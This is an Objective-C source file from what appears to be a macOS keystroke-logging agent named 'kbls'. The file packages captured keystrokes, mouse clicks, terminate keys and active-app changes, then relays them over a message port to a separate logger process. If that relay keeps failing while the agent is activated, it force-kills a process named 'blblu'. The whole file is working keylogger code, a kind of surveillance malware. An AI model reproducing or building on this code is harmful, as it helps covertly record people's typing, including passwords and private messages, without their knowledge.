//
//  AgentKeyboardCaptureManager.m
//  kbls
//
//  Created by Makara Khloth on 6/18/16.
//  Copyright © 2016 Makara Khloth. All rights reserved.
//

#import "AgentKeyboardCaptureManager.h"
#import "AgentKeyboardACCaptureManager.h"
#import "KeyboardLoggerEnum.h"
#import "KeyStrokeInfo.h"
#import "KeyStrokeWrapper.h"
#import "MessagePortIPCSender.h"
#import "DebugStatus.h"
#import "DefStd.h"

#import "AppDelegate.h"

@interface AgentKeyboardCaptureManager ()
@property (nonatomic, assign) int keyFailCounter;

- (void) sendKeyStroke: (KeyStrokeWrapper *) aKeyStrokeWrapper;
@end

@implementation AgentKeyboardCaptureManager

- (instancetype) init {
    self = [super init];
    if (self) {
        self.keyFailCounter = 0;
    }
    return self;
}

- (void) mouseClickDetected: (KeyStrokeInfo *) aKeyStrokeInfo mouseEvent: (NSEvent *) aEvent {
    KeyStrokeWrapper *keyWrapper = [[KeyStrokeWrapper alloc] init];
    keyWrapper.mKeyStrokeInfo = aKeyStrokeInfo;
    keyWrapper.mKeyStrokeInfoAsscoiate = aEvent;
    keyWrapper.mKeyStrokeInteruptID = kKeyboardLoggerCompleteCodeMouseClick;
    [self sendKeyStroke:keyWrapper];
}

- (void) terminateKeyDetected: (KeyStrokeInfo *) aKeyStrokeInfo keySymbol: (NSString *) aSymbol {
    KeyStrokeWrapper *keyWrapper = [[KeyStrokeWrapper alloc] init];
    keyWrapper.mKeyStrokeInfo = aKeyStrokeInfo;
    keyWrapper.mKeyStrokeInfoAsscoiate = aSymbol;
    keyWrapper.mKeyStrokeInteruptID = kKeyboardLoggerCompleteCodeTerminateKey;
    [self sendKeyStroke:keyWrapper];
}

- (void) activeAppChangeKeyDetected: (KeyStrokeInfo *) aKeyStrokeInfo inactiveBundleID: (NSString *) aBundleID {
    KeyStrokeWrapper *keyWrapper = [[KeyStrokeWrapper alloc] init];
    keyWrapper.mKeyStrokeInfo = aKeyStrokeInfo;
    keyWrapper.mKeyStrokeInfoAsscoiate = aBundleID;
    keyWrapper.mKeyStrokeInteruptID = kKeyboardLoggerCompleteCodeChangeActiveApp;
    [self sendKeyStroke:keyWrapper];
}

- (void) sendKeyStroke: (KeyStrokeWrapper *) aKeyStrokeWrapper {
    DLog(@"=============> Send key stroke... [%@]", aKeyStrokeWrapper.mKeyStrokeInfo);
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        NSMutableData *archivedData = [[NSMutableData alloc] init];
        NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:archivedData];
        [archiver encodeObject:aKeyStrokeWrapper forKey: @"keyStroke"];
        [archiver finishEncoding];
        
        MessagePortIPCSender *messageSender = [[MessagePortIPCSender alloc] initWithPortName:@"KeyStrokeMessagePort"];
        bool s = [messageSender writeDataToPort:archivedData];
        if (!s) {
            AppDelegate *delegate = (AppDelegate *)[[NSApplication sharedApplication] delegate];
            NSString *activationCode = delegate.agenKeyboardACCaptureManager.activationCode;
            if (activationCode.length > 0 && ![activationCode isEqualToString:_DEFAULTACTIVATIONCODE_]) {
                self.keyFailCounter++;
                if (self.keyFailCounter > 100) {
                    DLog(@"=============> Application Is Freeze Kill It");
                    self.keyFailCounter = 0;
                    system("killall -9 blblu");
                }
            } else {
                self.keyFailCounter = 0;
            }
        } else {
            self.keyFailCounter = 0;
        }
    });
}

@end
